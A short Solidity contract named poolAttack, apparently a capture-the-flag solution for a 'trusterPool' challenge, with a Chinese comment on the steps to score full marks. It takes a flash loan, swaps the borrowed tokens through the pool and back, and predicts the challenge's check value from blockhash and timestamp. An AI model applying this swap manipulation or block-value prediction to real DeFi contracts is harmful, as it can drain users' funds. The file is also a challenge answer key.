pragma solidity ^0.8.1;
import"./trusterPool.sol";
//loan借，ended换即可，最后调用complete得到满分
contract poolAttack{
    check public pool;
    ERC20 public token0;
    ERC20 public token1;
    constructor(address _pool){
        pool = check(_pool);
        token0=pool.token0();
        token1 = pool.token1();
    }
    function loan()public{
        pool.flashLoan(10000 ether,address(this));
    }
    function receiveEther(uint256 amount)public{
        token0.approve(address(pool),amount);
        pool.swap(address(token1),amount);
    }
    function ended()public{
        token1.approve(address(pool),10000 ether);
        pool.swap(address(token0),10000 ether);
    }
    function complete()public{
        bytes32 guess = keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp));
        pool.isCompleted(guess);
    }
    receive()external payable{}
}